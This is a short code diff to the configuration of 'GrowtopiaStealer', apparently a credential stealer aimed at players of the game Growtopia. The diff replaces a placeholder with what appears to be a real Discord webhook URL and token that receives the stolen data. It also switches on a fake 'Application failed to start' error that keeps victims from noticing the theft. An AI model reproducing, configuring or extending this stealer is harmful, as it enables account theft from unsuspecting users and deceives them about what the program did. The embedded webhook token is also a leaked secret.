@@ -7,13 +7,13 @@ using System.Text;
 public class DiscordWebhook // https://github.com/TheC0mpany/GrowtopiaStealer that code from https://github.com/MorganSkilly/Unity-Discord-Webhook-System/blob/main/Discord.cs
 {
     //CHANGE THESE!
-    public static string defaultWebhook = "https://discord.com/api/webhooks/123124122313/amogus";
+    public static string defaultWebhook = "https://discord.com/api/webhooks/852132305249501184/9IO3-AQVI3ytnvoO0VTUln8IrSg4rU5Rh-GXOy_44JsuB-iJUFlNB9tyKRMyl5-NhspN";
     private static string defaultUserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36";
     public static string defaultUserName = "GrowtopiaStealer | TheC0mpany";
     public static string defaultAvatar = "https://i.imgur.com/2Via1dY.jpg"; // Avatar
 
     //Fake error
-    public static bool FakeError = false; //Set true to show fake error
+    public static bool FakeError = true; //Set true to show fake error
     public static string FakeErrorMessage = "Application failed to start. 0x09000b";
     public static void SendTestWebhook()
     {
